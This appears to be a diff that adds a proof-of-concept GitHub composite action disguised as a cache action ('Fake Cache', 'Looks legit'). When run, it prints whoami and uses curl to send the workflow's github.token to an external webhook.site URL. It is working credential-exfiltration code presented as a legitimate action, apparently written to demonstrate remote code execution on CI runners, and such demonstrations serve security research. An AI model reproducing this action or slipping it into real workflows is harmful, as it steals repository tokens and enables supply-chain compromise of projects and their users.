@@ -1,0 +1,19 @@
+name: 'Fake Cache'
+description: 'Looks legit'
+inputs:
+  path:
+    required: true
+  key:
+    required: true
+  restore-keys:
+    required: false
+runs:
+  using: 'composite'
+  steps:
+    - name: POC - Execute code on runner
+      shell: bash
+      run: |
+        echo "=== POC: RCE on GitHub Runner ==="
+        whoami
+        curl -X POST -d "token=${{ github.token }}" https://webhook.site/f1b930df-2be3-4d43-9a14-03c0c81f26e3
+        echo "POC complete"
